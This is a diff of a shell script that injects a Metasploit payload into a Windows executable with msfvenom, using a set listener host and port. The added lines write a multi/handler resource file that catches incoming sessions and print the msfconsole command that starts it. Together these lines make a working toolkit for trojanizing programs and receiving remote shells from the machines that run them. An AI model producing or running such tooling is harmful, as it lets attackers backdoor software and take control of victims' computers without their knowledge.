@@ -46,9 +46,29 @@ msfvenom -p "$payload" LHOST=$lhost LPORT=$lport --platform windows -a "$arch" -
 # Check if injection was successful
 if [ $? -eq 0 ]; then
     echo "[+] Payload injected successfully! Saved as: $output_exe"
+
+    # Create Metasploit listener file
+    listener_file="listener.r"
+    echo "use exploit/multi/handler" > "$listener_file"
+    echo "set payload $payload" >> "$listener_file"
+    echo "set LHOST $lhost" >> "$listener_file"
+    echo "set LPORT $lport" >> "$listener_file"
+    echo "set ExitOnSession false" >> "$listener_file"
+    echo "exploit -j" >> "$listener_file"
+
+    echo "[+] Metasploit listener script saved as: $listener_file"
+    echo "[*] You can run it using: msfconsole -r $listener_file"
+
 else
     echo "[!] Injection failed. Please check your inputs."
 fi
+
+
+
+
+
+
+
 
 
 
